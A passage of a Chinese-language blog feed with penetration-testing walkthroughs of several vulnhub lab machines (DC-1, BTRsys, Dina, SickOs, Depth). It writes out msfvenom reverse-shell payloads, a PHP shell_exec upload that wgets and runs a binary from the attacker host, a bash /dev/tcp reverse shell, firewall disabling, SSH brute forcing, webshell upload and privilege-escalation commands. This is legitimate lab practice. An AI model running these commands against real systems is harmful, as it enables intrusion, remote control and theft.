class="language-mysql">use drupaldb;show tables;</code></pre><p><img src="/2022/04/29/dc-1/image-20220429155250311.png" alt="image-20220429155250311"></p><p>看到有一个<code>users</code></p><pre class=" language-mysql"><code class="language-mysql">select * from users;</code></pre><p><img src="/2022/04/29/dc-1/image-20220429155405867.png" alt="image-20220429155405867"></p><h4 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h4><h5 id="第一种方法："><a href="#第一种方法：" class="headerlink" title="第一种方法："></a>第一种方法：</h5><p>可以利用他的加密工具</p><pre class=" language-Linux"><code class="language-Linux">php scripts/password-hash.sh 123456</code></pre><p><img src="/2022/04/29/dc-1/image-20220429160235583.png" alt="image-20220429160235583"></p><p>然后在数据库里</p><pre class=" language-mysql"><code class="language-mysql">update users set pass='$S$DvqJa2J5CK5sebLmCwH8AO.pAnGTZPvGTO0CLAuXDrZztNEarbuB' where name='admin';</code></pre><p><img src="/2022/04/29/dc-1/image-20220429160953279.png" alt="image-20220429160953279"></p><h5 id="第二种方法："><a href="#第二种方法：" class="headerlink" title="第二种方法："></a>第二种方法：</h5><p>打开msf</p><pre class=" language-Linux"><code class="language-Linux">msfconsolesearchsploit drupal</code></pre><p><img src="/2022/04/29/dc-1/image-20220429162403787.png" alt="image-20220429162403787"></p><p>用这个添加用户</p><pre class=" language-Linux"><code class="language-Linux">python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.3.162 -u test -p 123</code></pre><p><img src="/2022/04/29/dc-1/image-20220429162635754.png" alt="image-20220429162635754"></p><p>完成了</p><p>通过账号密码登录网站</p><p>在Dashboard里面找到了flag3</p><p><img src="/2022/04/29/dc-1/image-20220429162847675.png" alt="image-20220429162847675"></p><h4 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h4><p>查看一下<code>/etc/passwd</code>，发现flag4</p><pre class=" language-Linux"><code class="language-Linux">cat /etc/passwd</code></pre><p><img src="/2022/04/29/dc-1/image-20220429163109064.png" alt="image-20220429163109064"></p><p>再查看<code>shadow</code>发现没有权限</p><pre class=" language-Linux"><code class="language-Linux">cat /etc/shadow</code></pre><p><img src="/2022/04/29/dc-1/image-20220429163147795.png" alt="image-20220429163147795"></p><h4 id="破解账号"><a href="#破解账号" class="headerlink" title="破解账号"></a>破解账号</h4><p>可以使用<code>hydra</code>破解ssh</p><pre class=" language-Linux"><code class="language-Linux">hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz 192.168.3.162 ssh</code></pre><p><img src="/2022/04/29/dc-1/image-20220429163431482.png" alt="image-20220429163431482"></p><p>登录尝试</p><pre class=" language-Linux"><code class="language-Linux">ssh flag4@192.168.3.162</code></pre><p><img src="/2022/04/29/dc-1/image-20220429163525590.png" alt="image-20220429163525590"></p><p>成功</p><h4 id="root权限"><a href="#root权限" class="headerlink" title="root权限"></a>root权限</h4><p>先看看root目录里有啥</p><pre class=" language-Linux"><code class="language-Linux">find /root</code></pre><p><img src="/2022/04/29/dc-1/image-20220429163830359.png" alt="image-20220429163830359"></p><p>找一找什么东西能用<code>root</code>权限执行</p><pre class=" language-Linux"><code class="language-Linux">find / -perm -u=s -type f 2>/dev/null</code></pre><p><img src="/2022/04/29/dc-1/image-20220429164039746.png" alt="image-20220429164039746"></p><p>可以利用find命令提权</p><pre class=" language-Linux"><code class="language-Linux">find / -name abc -exec "/bin/sh" \;whoamicd /rootlscat thefinalflag.txt</code></pre><p><img src="/2022/04/29/dc-1/image-20220429164551811.png" alt="image-20220429164551811"></p><p>完美</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 综合实战 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合实战第二章-BTRsys-2</title>
      <link href="/2022/04/28/btrsys-2/"/>
      <url>/2022/04/28/btrsys-2/</url>
      
        <content type="html"><![CDATA[<h1 id="综合实战第二章"><a href="#综合实战第二章" class="headerlink" title="综合实战第二章"></a>综合实战第二章</h1><h2 id="大综合实战1"><a href="#大综合实战1" class="headerlink" title="大综合实战1"></a>大综合实战1</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote><p>靶场下载地址：<a href="https://www.vulnhub.com/entry/btrsys-v21,196/">https://www.vulnhub.com/entry/btrsys-v21,196/</a></p><p>攻击机：kali 192.168.3.134</p><p>靶机：BTRsys2 192.168.3.161</p></blockquote><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>日常nmap扫</p><pre class=" language-Linux"><code class="language-Linux">nmap -p- -A 192.168.3.161</code></pre><p><img src="/2022/04/28/btrsys-2/image-20220429083556223.png" alt="image-20220429083556223"></p><p>老规矩，看80端口</p><p><img src="/2022/04/28/btrsys-2/image-20220429083653821.png" alt="image-20220429083653821"></p><p>精神污染！</p><p>用别的玩意扫一下</p><pre class=" language-Linux"><code class="language-Linux">nikto -h http://192.168.3.161</code></pre><p><img src="/2022/04/28/btrsys-2/image-20220429084033057.png" alt="image-20220429084033057"></p><p>疑似<code>wordpress</code>搞得</p><p>dirsearch扫一下</p><pre class=" language-Linux"><code class="language-Linux">dirsearch -u http://192.168.3.161</code></pre><p><img src="/2022/04/28/btrsys-2/image-20220429084419683.png" alt="image-20220429084419683"></p><p>找到后台登录界面</p><p>现在使用工具wpscan扫描一下</p><pre class=" language-Linux"><code class="language-Linux">wpscan --url http://192.168.3.161/wordpress --enumerate at --enumerate ap --enumerate u</code></pre><p><img src="/2022/04/28/btrsys-2/image-20220429091214769.png" alt="image-20220429091214769"></p><p>扫出来挺多好东西</p><p>可以去进行登录进入后台</p><p>然后可以在404页面进行木马注入了</p><p><img src="/2022/04/28/btrsys-2/image-20220429091509966.png" alt="image-20220429091509966"></p><h3 id="上传木马"><a href="#上传木马" class="headerlink" title="上传木马"></a>上传木马</h3><p>老规矩，生成木马</p><pre class=" language-Linux"><code class="language-Linux">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.3.134 lport=4444 -f raw > /root/msfshell.phpmsfconsoleuse exploit/multi/handler set payload php/meterpreter/reverse_tcpset lhost 192.168.3.134set lport 4444run</code></pre><p>把生成的木马扔进404.php里面，upload file</p><p>然后访问</p><pre class=" language-base"><code class="language-base">http://192.168.3.161/wordpress/wp-content/themes/twentyfourteen/404.php</code></pre><p>结束</p><p><img src="/2022/04/28/btrsys-2/image-20220429092602552.png" alt="image-20220429092602552"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>查看linux版本</p><pre class=" language-Linux"><code class="language-Linux">uname -a</code></pre><p><img src="/2022/04/28/btrsys-2/image-20220429092846636.png" alt="image-20220429092846636"></p><p>发现是<code>ubuntu 4.4.0</code></p><p>查一下有什么漏洞</p><pre class=" language-Linux"><code class="language-Linux">searchsploit ubuntu 4.4.0</code></pre><p><img src="/2022/04/28/btrsys-2/image-20220429093011134.png" alt="image-20220429093011134"></p><p>随便用一个</p><pre class=" language-Linux"><code class="language-Linux">cd /usr/share/exploitdb/exploits/linux/localcp 41458.c /root cd /rootgcc 41458.c -o shellroot</code></pre><p>然后在msf里</p><pre class=" language-Linux"><code class="language-Linux">upload /root/shellrootshellchmod 777 shellroot./shellrootwhoami</code></pre><p><img src="/2022/04/28/btrsys-2/image-20220429093354050.png" alt="image-20220429093354050"></p><p>提权到root权限</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 综合实战 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合实战第二章-BTRsys-1</title>
      <link href="/2022/04/28/btrsys-1/"/>
      <url>/2022/04/28/btrsys-1/</url>
      
        <content type="html"><![CDATA[<h1 id="综合实战第二章"><a href="#综合实战第二章" class="headerlink" title="综合实战第二章"></a>综合实战第二章</h1><h2 id="大综合实战1"><a href="#大综合实战1" class="headerlink" title="大综合实战1"></a>大综合实战1</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote><p>靶场下载地址：<a href="https://www.vulnhub.com/entry/btrsys-v1,195/">https://www.vulnhub.com/entry/btrsys-v1,195/</a></p><p>攻击机：kali 192.168.3.134</p><p>靶机：BTRsys1 192.168.3.160</p></blockquote><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>先用nmap扫一下</p><pre class=" language-Linux"><code class="language-Linux">nmap -p- -A 192.168.3.160</code></pre><p><img src="/2022/04/28/btrsys-1/image-20220428195737162.png" alt="image-20220428195737162"></p><p>发现有21,22,80端口</p><p><img src="/2022/04/28/btrsys-1/image-20220428200012439.png" alt="image-20220428200012439"></p><p>没啥东西，用别的玩意扫一下</p><pre class=" language-Linux"><code class="language-Linux">nikto -h http://192.168.3.160</code></pre><p><img src="/2022/04/28/btrsys-1/image-20220428200420050.png" alt="image-20220428200420050"></p><p>看看这俩里面有啥</p><p>config.php里面啥也没有</p><p>login.php里面有一个登录界面</p><p><img src="/2022/04/28/btrsys-1/image-20220428200733250.png" alt="image-20220428200733250"></p><p>有一个登录界面，可以进行暴力破解，sql注入试试之类的</p><p>先打开burpsuite</p><pre class=" language-Linux"><code class="language-Linux">burpsuite</code></pre><p>然后另起一个窗口,把sql注入测试用的玩意扔到&#x2F;root目录</p><pre class=" language-Linux"><code class="language-Linux">cd /usr/share/wordlists/wfuzz/Injectionscp SQL.txt /root/SQL.txt</code></pre><p>接下来抓包</p><p>发现需要特殊账号</p><p>查看源代码发现</p><p><img src="/2022/04/28/btrsys-1/image-20220428201745909.png" alt="image-20220428201745909"></p><p>重新测试</p><p><img src="/2022/04/28/btrsys-1/image-20220428201816194.png" alt="image-20220428201816194"></p><p>抓到了</p><p><img src="/2022/04/28/btrsys-1/image-20220428201924612.png" alt="image-20220428201924612"></p><p>然后在密码处打标记，测试</p><p><img src="/2022/04/28/btrsys-1/image-20220428202016600.png" alt="image-20220428202016600"></p><p><img src="/2022/04/28/btrsys-1/image-20220428202104195.png" alt="image-20220428202104195"></p><p><code>start attack</code>开始测试</p><p><img src="/2022/04/28/btrsys-1/image-20220428202329875.png" alt="image-20220428202329875"></p><p>有这种<code>2900</code>长度的</p><p>其他的登录的话啥也没有，用这种做密码会有一个文件上传的框</p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p><img src="/2022/04/28/btrsys-1/image-20220428202610413.png" alt="image-20220428202610413"></p><p>观察一下这个玩意</p><p><img src="/2022/04/28/btrsys-1/image-20220428202723078.png" alt="image-20220428202723078"></p><p>默认是需要.jpg的文件上传</p><p>上传，抓包</p><p><img src="/2022/04/28/btrsys-1/image-20220428202845872.png" alt="image-20220428202845872"></p><p>在此之前可以先构造好一个木马文件，然后建立好监听</p><pre class=" language-Linux"><code class="language-Linux">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.3.134 lport=4444 -f raw > /root/msfshell.phpmsfconsoleuse exploit/multi/handler set payload php/meterpreter/reverse_tcpset lhost 192.168.3.134set lport 4444run</code></pre><p>准备上传</p><p><img src="/2022/04/28/btrsys-1/image-20220428203734656.png" alt="image-20220428203734656"></p><p><img src="/2022/04/28/btrsys-1/image-20220428203840890.png" alt="image-20220428203840890"></p><p>这样是上传失败</p><p>把木马shell.php改成shell.jpg上传，然后抓包改回php,上传成功</p><p><img src="/2022/04/28/btrsys-1/image-20220428204335834.png" alt="image-20220428204335834"></p><p>但是找不到木马上传到什么地方</p><p>用dirsearch扫一下目录</p><pre class=" language-Linux"><code class="language-Linux">dirsearch -u http://192.168.3.134</code></pre><p><img src="/2022/04/28/btrsys-1/image-20220428204622659.png" alt="image-20220428204622659"></p><p>发现<code>uploads</code>目录</p><p><img src="/2022/04/28/btrsys-1/image-20220428204646554.png" alt="image-20220428204646554"></p><p>木马就在里面</p><p><img src="/2022/04/28/btrsys-1/image-20220428204708301.png" alt="image-20220428204708301"></p><p>成了</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>美化一下</p><pre class=" language-Linux"><code class="language-Linux">python -c 'import pty;pty.spawn("/bin/bash")'</code></pre><p>然后查看一下config.php</p><pre class=" language-Linux"><code class="language-Linux">cat config.php</code></pre><p>发现了sql的账号和密码</p><p><img src="/2022/04/28/btrsys-1/image-20220428205030929.png" alt="image-20220428205030929"></p><p>可以直接进数据库了</p><pre class=" language-Linux"><code class="language-Linux">mysql -uroot -ptoor</code></pre><pre class=" language-mysql"><code class="language-mysql">show databases;use deneme;show tables;select * from user;</code></pre><p><img src="/2022/04/28/btrsys-1/image-20220428205257670.png" alt="image-20220428205257670"></p><p>密码是<code>asd123***</code></p><p>尝试su root</p><pre class=" language-Linux"><code class="language-Linux">su root</code></pre><p><img src="/2022/04/28/btrsys-1/image-20220428205438640.png" alt="image-20220428205438640"></p><p>完美</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 综合实战 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合实战第一章-命令注入实战</title>
      <link href="/2022/04/27/Dina/"/>
      <url>/2022/04/27/Dina/</url>
      
        <content type="html"><![CDATA[<h1 id="综合实战第一章"><a href="#综合实战第一章" class="headerlink" title="综合实战第一章"></a>综合实战第一章</h1><h2 id="命令注入实战"><a href="#命令注入实战" class="headerlink" title="命令注入实战"></a>命令注入实战</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote><p>本次环境使用的是vulnhub靶场里面的Dina-1.0.1</p><p>靶场下载地址:<a href="https://www.vulnhub.com/entry/dina-101,200/">https://www.vulnhub.com/entry/dina-101,200/</a></p><p>攻击机:kali 192.168.3.134</p><p>靶机:dina 192.168.3.159</p></blockquote><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>老规矩，nmap</p><pre class=" language-Linux"><code class="language-Linux">nmap -p- -A 192.168.3.159</code></pre><p><img src="/2022/04/27/Dina/image-20220427164132277.png" alt="image-20220427164132277"></p><p>只有80端口，进网页看看</p><p><img src="/2022/04/27/Dina/image-20220427164925222.png" alt="image-20220427164925222"></p><p><img src="/2022/04/27/Dina/image-20220427164938666.png" alt="image-20220427164938666"></p><p>啥也没有，只好扫一扫敏感目录，用dirb和nikto找一找</p><pre class=" language-Linux"><code class="language-Linux">dirb http://192.168.3.159nikto -h http://192.168.3.159</code></pre><p><img src="/2022/04/27/Dina/image-20220427170233238.png" alt="image-20220427170233238"></p><p>找到robots.txt，去看一眼</p><p><img src="/2022/04/27/Dina/image-20220427170321327.png" alt="image-20220427170321327"></p><p>都挨个看看有没有能利用的地方</p><p>找了一圈发现除了<code>nothing</code>别的都是目录</p><p><img src="/2022/04/27/Dina/image-20220427170535174.png" alt="image-20220427170535174"></p><p>看一下源码</p><p><img src="/2022/04/27/Dina/image-20220427170619291.png" alt="image-20220427170619291"></p><p>暂时不知道干啥，先扔这</p><p><img src="/2022/04/27/Dina/image-20220427170712255.png" alt="image-20220427170712255"></p><p>再去这里面看看</p><p><img src="/2022/04/27/Dina/image-20220427170755121.png" alt="image-20220427170755121"></p><p>下载下来看看</p><p>打开提示输入密码，我们把上面源代码里面的注释挨个试试</p><p><img src="/2022/04/27/Dina/image-20220427170934426.png" alt="image-20220427170934426"></p><p>用freedom解压成功，出来一个mp3格式的文件</p><p>双击发现打不开，查看文件格式</p><pre class=" language-Linux"><code class="language-Linux">file backup-cred.mp3</code></pre><p><img src="/2022/04/27/Dina/image-20220427171123588.png" alt="image-20220427171123588"></p><pre class=" language-Linux"><code class="language-Linux">cat backup-cred.mp3</code></pre><p><img src="/2022/04/27/Dina/image-20220427171157649.png" alt="image-20220427171157649"></p><p>访问这个url</p><p>输入用户名和密码，密码就从上面源代码里面试，最后发现是diana</p><p><img src="/2022/04/27/Dina/image-20220427171332547.png" alt="image-20220427171332547"></p><p>在这个网站找找有没有什么可以利用的地方</p><p><img src="/2022/04/27/Dina/image-20220427171543855.png" alt="image-20220427171543855"></p><p>找到一个上传点</p><p>打开burpsuite</p><p>上传一个csv文件，抓包</p><p><img src="/2022/04/27/Dina/image-20220427183602124.png" alt="image-20220427183602124"></p><p>扔进send to repeater里面</p><p>然后放行，查看上传到哪个位置</p><p>都找了一遍目录之后发现找不到文件</p><p>再抓一下包，看看文件名能不能进行更改</p><p><img src="/2022/04/27/Dina/image-20220427184420452.png" alt="image-20220427184420452"></p><p>发现回显整出来了</p><p><img src="/2022/04/27/Dina/image-20220427184448319.png" alt="image-20220427184448319"></p><p>发现存在命令执行漏洞</p><h3 id="构造木马"><a href="#构造木马" class="headerlink" title="构造木马"></a>构造木马</h3><pre class=" language-Linux"><code class="language-Linux">msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.3.134 lport=4444 -f elf > /root/shell</code></pre><p>打开msf</p><pre class=" language-Linux"><code class="language-Linux">msfconsoleuse exploit/multi/handler set payload linux/x86/meterpreter/reverse_tcpset lhost 192.168.3.134set lport 4444exploit</code></pre><p>再打开一个窗口</p><pre class=" language-Linux"><code class="language-Linux">python -m SimpleHTTPServer  </code></pre><p>把下载指令base64编码一下</p><pre class=" language-Linux"><code class="language-Linux">echo 'wget http://192.168.3.134:8000/shell -O /tmp/shell' | base64echo 'chmod 777 /tmp/shell' | base64 echo '/tmp/shell' | base64  </code></pre><p><img src="/2022/04/27/Dina/image-20220427190541349.png" alt="image-20220427190541349"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>可以抓包，构造上传木马语句</p><pre class=" language-php"><code class="language-php"><span class="token string">"&lt;?php shell_exec(base64_decode('上面的base64编码'));die();?>.php"</span></code></pre><p><img src="/2022/04/27/Dina/image-20220427191849080.png" alt="image-20220427191849080"></p><p>有人下载了</p><p><img src="/2022/04/27/Dina/image-20220427193503344.png" alt="image-20220427193503344"></p><p>成功</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>接下来就是提权了</p><pre class=" language-Linux"><code class="language-Linux">shellsudo -l</code></pre><p>先查看权限</p><p><img src="/2022/04/27/Dina/image-20220427193626022.png" alt="image-20220427193626022"></p><p>发现在perl里面是所有权限</p><p>先美化界面</p><pre class=" language-Linux"><code class="language-Linux">python -c 'import pty;pty.spawn("/bin/bash")'</code></pre><p><img src="/2022/04/27/Dina/image-20220427193735902.png" alt="image-20220427193735902"></p><p>提权</p><pre class=" language-Linux"><code class="language-Linux">sudo perl -e "exec '/bin/sh'"</code></pre><p><img src="/2022/04/27/Dina/image-20220427193853846.png" alt="image-20220427193853846"></p><p>直接就是root权限了</p><p><img src="/2022/04/27/Dina/image-20220427193955237.png" alt="image-20220427193955237"></p><p>拿到flag</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 综合实战 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合实战第一章-PUT漏洞实战</title>
      <link href="/2022/04/26/sickos/"/>
      <url>/2022/04/26/sickos/</url>
      
        <content type="html"><![CDATA[<h1 id="综合实战第一章"><a href="#综合实战第一章" class="headerlink" title="综合实战第一章"></a>综合实战第一章</h1><h2 id="PUT漏洞实战"><a href="#PUT漏洞实战" class="headerlink" title="PUT漏洞实战"></a>PUT漏洞实战</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote><p>本次环境使用的是vulnhub靶场里面的sickos:1.2</p><p>靶场下载地址:<a href="https://www.vulnhub.com/entry/sickos-12,144/">https://www.vulnhub.com/entry/sickos-12,144/</a></p><p>攻击机:kali 192.168.3.134</p><p>靶机:sickos 192.168.3.158</p></blockquote><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>又是枯燥的信息搜集</p><pre class=" language-Linux"><code class="language-Linux">namp -p- -A 192.168.3.158</code></pre><p><img src="/2022/04/26/sickos/image-20220426205642413.png" alt="image-20220426205642413"></p><p>开放了80端口和22号端口</p><p>访问80端口</p><p><img src="/2022/04/26/sickos/image-20220426205725119.png" alt="image-20220426205725119"></p><p>没啥好找的，用dirb和nikto扫一下</p><pre class=" language-Linux"><code class="language-Linux">dirb http://192.168.3.158nikto -h 192.168.3.158</code></pre><p><img src="/2022/04/26/sickos/image-20220426205907908.png" alt="image-20220426205907908"></p><p><img src="/2022/04/26/sickos/image-20220426205924146.png" alt="image-20220426205924146"></p><p>找到了一个&#x2F;test&#x2F;目录，进去看看吧</p><p><img src="/2022/04/26/sickos/image-20220426221610553.png" alt="image-20220426221610553"></p><p>用owasp-zap扫描一下</p><pre class=" language-Linux"><code class="language-Linux">owasp-zap</code></pre><p><img src="/2022/04/26/sickos/image-20220426222532834.png" alt="image-20220426222532834"></p><p>也没有啥</p><p>可以用curl扫一下</p><pre class=" language-Linux"><code class="language-Linux">curl -x -v OPTIONS http://192.168.3.158/test</code></pre><p><img src="/2022/04/26/sickos/image-20220426222829443.png" alt="image-20220426222829443"></p><p>发现支持PUT</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>可以利用火狐插件进行上传</p><p>首先准备好一个webshell（这里使用weevely）</p><pre class=" language-Linux"><code class="language-Linux">weevely generate 123456 /root/shell.php</code></pre><p>然后打开火狐，使用扩展RESTClient</p><p>把webshell扔进去</p><p><img src="/2022/04/26/sickos/image-20220426224415603.png" alt="image-20220426224415603"></p><p>测试一下</p><p><img src="/2022/04/26/sickos/image-20220426224452282.png" alt="image-20220426224452282"></p><p>上去了，连一下试试</p><p><img src="/2022/04/26/sickos/image-20220426224553668.png" alt="image-20220426224553668"></p><p>成了，剩下就是提权！结束！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 综合实战 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合实战第一章-命令执行实战</title>
      <link href="/2022/04/26/b2r/"/>
      <url>/2022/04/26/b2r/</url>
      
        <content type="html"><![CDATA[<h1 id="综合实战第一章"><a href="#综合实战第一章" class="headerlink" title="综合实战第一章"></a>综合实战第一章</h1><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote><p>靶场下载地址：<a href="https://www.vulnhub.com/entry/depth-1,213/">https://www.vulnhub.com/entry/depth-1,213/</a></p><p>攻击机：kali 192.168.3.134</p><p>靶机：DepthB2R 192.168.3.175</p></blockquote><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>先nmap</p><pre class=" language-Linux"><code class="language-Linux">nmap -p- -A 192.168.3.175</code></pre><p><img src="/2022/04/26/b2r/image-20220508170717605.png" alt="image-20220508170717605"></p><p>只有8080端口开放，先访问一下<code>http://192.168.3.175:8080</code></p><p><img src="/2022/04/26/b2r/image-20220508170831432.png" alt="image-20220508170831432"></p><p>看不出什么来，扫描一下目录吧</p><pre class=" language-Linux"><code class="language-Linux">nikto -h http://192.168.3.175:8080</code></pre><p><img src="/2022/04/26/b2r/image-20220508171012898.png" alt="image-20220508171012898"></p><p>发现有个<code>/test.jsp</code>，去看看</p><p><img src="/2022/04/26/b2r/image-20220508171149058.png" alt="image-20220508171149058"></p><p>发现在里面输入命令他会执行</p><pre class=" language-Linux"><code class="language-Linux">uname -a</code></pre><p><img src="/2022/04/26/b2r/image-20220508171247151.png" alt="image-20220508171247151"></p><p>会输出信息，确定存在命令执行漏洞</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>查看一下<code>/home</code>目录，发现存在<code>bill</code>这个用户</p><pre class=" language-Linux"><code class="language-Linux">ls -la /home</code></pre><p><img src="/2022/04/26/b2r/image-20220508171451520.png" alt="image-20220508171451520"></p><p>查看进程发现开放ssh，但是nmap没有扫描出来，猜测有防火墙</p><pre class=" language-Linux"><code class="language-Linux">ps -aux</code></pre><p><img src="/2022/04/26/b2r/image-20220508171640040.png" alt="image-20220508171640040"></p><p>在<code>/etc/</code>目录中发现防火墙</p><pre class=" language-Linux"><code class="language-Linux">ls -la /etc</code></pre><p><img src="/2022/04/26/b2r/image-20220508171745860.png" alt="image-20220508171745860"></p><p>有ssh的话可以利用ssh执行root权限命令</p><pre class=" language-Linux"><code class="language-Linux">ssh bill@localhost sudo -l</code></pre><p><img src="/2022/04/26/b2r/image-20220508172104491.png" alt="image-20220508172104491"></p><p>说明可以使用</p><p>关闭防火墙</p><pre class=" language-Linux"><code class="language-Linux">ssh bill@localhost ufw disable</code></pre><p><img src="/2022/04/26/b2r/image-20220508172158361.png" alt="image-20220508172158361"></p><p>没有回显说明成功了</p><p>先用nc监听</p><pre class=" language-Linux"><code class="language-Linux">nc -lvvp 4444</code></pre><p>构造连接</p><pre class=" language-Linux"><code class="language-Linux">ssh bill@localhost sudo bash -i >& /dev/tcp/192.168.3.134/4444 0>&1</code></pre><p><img src="/2022/04/26/b2r/image-20220508182016253.png" alt="image-20220508182016253"></p><p>成功！</p><p><img src="/2022/04/26/b2r/image-20220508182037496.png" alt="image-20220508182037496"></p><p>拿到flag</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a 